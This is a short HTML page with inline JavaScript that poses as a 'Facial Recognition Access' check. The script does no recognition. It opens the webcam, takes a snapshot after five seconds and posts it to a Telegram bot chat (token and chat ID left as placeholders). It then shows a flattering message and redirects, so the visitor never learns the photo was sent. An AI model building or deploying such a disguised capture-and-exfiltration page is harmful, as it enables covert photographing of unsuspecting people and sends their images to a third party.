<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facial Recognition</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
        }
        video {
            border: 2px solid black;
            margin-top: 20px;
        }
        #message {
            font-size: 24px;
            font-weight: bold;
            color: #ff4081;
            display: none;
        }
    </style>
</head>
<body>
    <h1>Facial Recognition Access</h1>
    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
    <p id="message"></p>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const message = document.getElementById('message');
        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => { video.srcObject = stream; })
            .catch(err => console.error("Error accessing camera: ", err));

        function captureAndSend() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
                if (!blob || blob.size === 0) {
                    video.style.display = "none";
                    message.innerText = "Error detecting face.";
                    message.style.color = "red";
                    message.style.display = "block";
                    setTimeout(() => { window.location.reload(); }, 3000);
                    return;
                }
                
                let formData = new FormData();
                formData.append("chat_id", TELEGRAM_CHAT_ID);
                formData.append("photo", blob, "face.jpg");
                
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData
                }).then(() => {
                    video.style.display = "none";
                    message.innerText = "You look handsome/beautiful today!";
                    message.style.display = "block";
                    setTimeout(() => { window.location.href = "nextpage.html"; }, 3000);
                }).catch(err => console.error("Error sending photo: ", err));
            }, 'image/jpeg');
        }
        
        setTimeout(captureAndSend, 5000);
    </script>
</body>
</html>
